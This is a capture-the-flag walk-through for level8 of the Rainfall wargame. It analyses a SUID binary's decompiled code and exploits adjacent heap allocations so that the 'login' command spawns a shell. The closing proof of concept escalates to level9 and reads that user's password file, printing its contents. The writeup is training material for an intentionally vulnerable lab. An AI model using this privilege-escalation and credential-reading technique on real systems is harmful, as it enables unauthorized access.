# Walk-through Level8

## Introduction
Level8 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.

## Security Checks
Examining the binary's security mechanisms reveals that it lacks several modern protections, making it more susceptible to exploitation:

```bash
level8@RainFall:~$ checksec --file level8 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level8
```
**Key observations:**
> **No RELRO** : The binary does not protect against GOT overwrite attacks.

> **No stack canary** : Buffer overflow attacks are possible.

> **NX disabled** : Stack is executable, allowing shellcode execution.

> **No PIE** : The binary has a fixed memory layout, making exploitation easier.

### Analyzing `level8`

After running the command `ls -l level8`, we observe the following output:

```
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
```

From this output, we can see that the binary `level8` is set with **SUID (Set User ID)** and **SGID (Set Group ID)** permissions. This means:

- The `s` in the owner (`rws`) and group (`r-s`) permission bits indicates that the program will run with the privileges of its owner (`level9`) and group (`users`), regardless of who executes it.
- In other words, when any user runs this program, it will execute as if it were run by the `level9` user.

## Debugging  

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
hello
(nil), (nil) 
hello world 
(nil), (nil) 
```

After running `./level8`, we noticed that it opens `stdin` to read input. However, before printing anything else, it outputs `(nil), (nil)`. Regardless of the input provided, it continues to print `(nil), (nil)`, which is unclear.  

To understand this behavior, we first attempted to analyze the assembly using GDB, but we still couldn't make sense of it. So, let's decompile this binary using **Dogbolt**.  

### What is Dogbolt?  
Dogbolt is the **Decompiler Explorer**, an interactive online tool that allows us to view C-like representations of decompiled programs using multiple decompilers, including:  

- **angr**  
- **Binary Ninja**  
- **Ghidra**  
- **Hex-Rays (IDA Pro)**  

My personal favorite is **Hex-Rays (IDA Pro)**. So, let's decompile the `main` function using Hex-Rays:  

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[5]; // [esp+20h] [ebp-88h] BYREF
  char v5[2]; // [esp+25h] [ebp-83h] BYREF
  char v6[129]; // [esp+27h] [ebp-81h] BYREF

  while ( 1 )
  {
    printf("%p, %p \n", auth, (const void *)service);
    if ( !fgets(s, 128, stdin) )
      break;
    if ( !memcmp(s, "auth ", 5u) )
    {
      auth = (char *)malloc(4u);
      *(_DWORD *)auth = 0;
      if ( strlen(v5) <= 0x1E )
        strcpy(auth, v5);
    }
    if ( !memcmp(s, "reset", 5u) )
      free(auth);
    if ( !memcmp(s, "service", 6u) )
      service = (int)strdup(v6);
    if ( !memcmp(s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1u, 0xAu, stdout);
    }
  }
  return 0;
}
```

### Code Analysis  

1. The program runs an **infinite loop** that processes input via `stdin`. The loop only stops if `fgets()` fails (e.g., if `stdin` is closed).  
2. It prints two pointer values (`auth` and `service`) at each iteration.  
3. The program recognizes four main commands:  
   - **"auth "** → Allocates 4 bytes (`malloc(4)`) for `auth` and initializes it to `0`. It then attempts to copy a string if `v5` is at most 30 characters.  
   - **"reset"** → Frees the `auth` pointer.  
   - **"service"** → Allocates memory using `strdup()`, storing its address in `service`.  
   - **"login"** → If `auth + 8` is **nonzero**, it executes `/bin/sh`. Otherwise, it prompts for a password.  

### Finding the Vulnerability
The key vulnerability is in:
``` c
if ( !memcmp(s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1u, 0xAu, stdout);
    }
```
so To trigger the shell we need to make auth + 8 
#### What We Know
The auth command allocates 4 bytes of memory but does not let us store more than 30 bytes due to strlen(v5) <= 0x1E.
So, we cannot directly write to auth + 8 using auth.
The service command allocates memory dynamically using strdup(v6).
This means that `service` could be placed in memory after `auth`. To confirm this, we run the following example:  
``` bash 
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
```
The address of `auth` starts at `0x804a008`, and the address of `service` is allocated right after `auth`, starting at `0x804a018`.

## Proof-of-Concept (Working Exploit)
 
``` bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service aaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018 
login 
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
